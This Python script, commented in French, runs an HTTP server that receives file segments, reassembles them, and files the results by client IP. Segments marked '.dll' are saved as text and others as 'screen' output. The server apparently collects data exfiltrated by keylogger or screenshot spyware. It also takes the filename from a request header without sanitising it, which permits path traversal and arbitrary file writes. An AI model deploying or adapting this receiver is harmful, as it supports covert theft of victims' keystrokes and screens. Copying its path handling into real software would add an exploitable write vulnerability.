import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn

PORT = 8080
BASE_DIR = os.getcwd()
SEGMENTS_DIR = os.path.join(BASE_DIR, "file_segments")
TEXT_DIR = BASE_DIR
SCREEN_DIR = BASE_DIR

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Un serveur HTTP multithreadé pour traiter plusieurs connexions simultanément."""
    daemon_threads = True  # Pour éviter les threads zombies

class FileReceiverHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            # Récupérer les en-têtes
            length = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(length)
            filename = self.headers.get("X-Filename", "unknown")
            file_type = self.headers.get("X-File-Type", "unknown")
            segment = int(self.headers.get("X-Segment-Number", "0"))
            total = int(self.headers.get("X-Total-Segments", "1"))
            client_ip = self.client_address[0]

            # Enregistrer le segment
            os.makedirs(SEGMENTS_DIR, exist_ok=True)
            part_path = os.path.join(SEGMENTS_DIR, f"{filename}.part{segment}")
            with open(part_path, "wb") as f:
                f.write(data)
            print(f"▶️  Segment {segment+1}/{total} reçu pour '{filename}'")

            # Vérifier si tous les segments sont reçus
            parts = [
                f for f in os.listdir(SEGMENTS_DIR)
                if f.startswith(f"{filename}.part")
            ]
            if len(parts) == total:
                print(f"🧩 Tous les segments reçus pour '{filename}', assemblage…")
                self.assemble_file(filename, file_type, client_ip, total)

            # Réponse
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")

        except Exception as e:
            print(f"❌ Erreur: {e}")
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Erreur serveur")

    def assemble_file(self, filename, file_type, client_ip, total):
        if file_type == ".dll":
            out_path = os.path.join(TEXT_DIR, f"{client_ip}.txt")
        else:  # output_screen
            client_folder = os.path.join(SCREEN_DIR, client_ip)
            os.makedirs(client_folder, exist_ok=True)
            out_path = os.path.join(client_folder, filename)

        with open(out_path, "wb") as out:
            for i in range(total):
                part_file = os.path.join(SEGMENTS_DIR, f"{filename}.part{i}")
                with open(part_file, "rb") as pf:
                    out.write(pf.read())
                os.remove(part_file)

        print(f"✅ Fichier assemblé et sauvegardé en '{out_path}'")

def run():
    server = ThreadedHTTPServer(("", PORT), FileReceiverHandler)
    print(f"🟢 Serveur HTTP écoute sur le port {PORT}")
    server.serve_forever()

if __name__ == "__main__":
    run()
